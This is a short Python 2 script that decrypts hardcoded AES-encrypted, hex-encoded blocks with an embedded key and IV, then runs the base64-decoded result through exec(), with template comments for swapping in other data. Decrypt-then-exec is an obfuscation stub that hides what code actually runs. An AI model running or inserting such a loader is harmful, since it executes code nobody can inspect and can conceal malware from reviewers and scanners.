from Crypto.Cipher import AES

#decrypt the array of encrypted code then execute
encrypted_data = ['31e84d4bf685e7be6ec2b49705c2f89e', 'd3887af59517df58ca9152e050bc35b4', 'f3c2f49a3e1edf4a52d1494208c6f506', '7c368e5edcc94188bdf259a8309289e8', 'd9db3062a4e3e0c3e2ca80547acc71f6'] #put ur data here
key = 'C7q047/lxm8HfQthGkSDlw=='.decode('base64').strip("\n").strip("\r\n").replace("\r\n","").replace("\n","") #key here
iv = 'EpM7RN3c4qMNVfsbD2QC5g=='.decode('base64').strip("\n").strip("\r\n").replace("\r\n","").replace("\n","") #IV here

decrypted_data = []
for i in encrypted_data:
	temp_data = i.decode('hex');aes = AES.new(key, AES.MODE_CBC, iv);decrypted_data.append(aes.decrypt(temp_data))

exec("".join(decrypted_data).decode('base64'))
